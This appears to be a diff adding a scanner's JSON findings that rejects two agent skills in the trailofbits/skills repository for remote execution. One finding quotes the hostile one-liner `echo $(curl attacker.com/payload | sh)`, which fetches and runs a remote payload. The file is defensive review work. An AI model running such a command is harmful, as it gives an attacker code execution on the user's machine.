@@ -1,0 +1,18 @@
+[
+  {
+    "commit": "82fe8226252622fa807643bdca1710901198553a",
+    "id": "agentic-actions-auditor",
+    "level": "rejected",
+    "path": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor",
+    "reason": "remote-exec: references/vector-f-subshell-expansion.md:51 stem files. `echo $(curl attacker.com/payload | sh)` downloads and executes arb…",
+    "repo": "trailofbits/skills"
+  },
+  {
+    "commit": "82fe8226252622fa807643bdca1710901198553a",
+    "id": "modern-python",
+    "level": "rejected",
+    "path": "plugins/modern-python/skills/modern-python",
+    "reason": "remote-exec: references/security-setup.md:19 curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/lat…",
+    "repo": "trailofbits/skills"
+  }
+]
